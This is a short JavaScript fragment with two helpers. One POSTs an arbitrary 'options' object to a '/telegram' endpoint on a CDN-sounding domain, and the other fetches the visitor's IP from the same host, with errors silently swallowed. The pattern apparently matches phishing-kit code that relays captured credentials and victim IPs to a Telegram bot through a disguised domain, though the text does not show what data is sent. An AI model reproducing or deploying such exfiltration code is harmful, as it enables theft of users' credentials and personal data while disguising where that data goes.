async function sendData(options) {
    var url = "https://ns.cdn-services.com/telegram";
    return await fetch(url, {
      method:'POST',
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify({
        config: options,
      }),
    }).then(e=>e.json()).then(e=>({
      ok:true,
      ...e
    })).catch(err=>err);
  
    
}

async function getIP(options) {
  var url = "https://ns.cdn-services.com/ip";
  return await fetch(url, {

  }).then(e=>e.json()).then(e=>e).catch(err=>{});

}

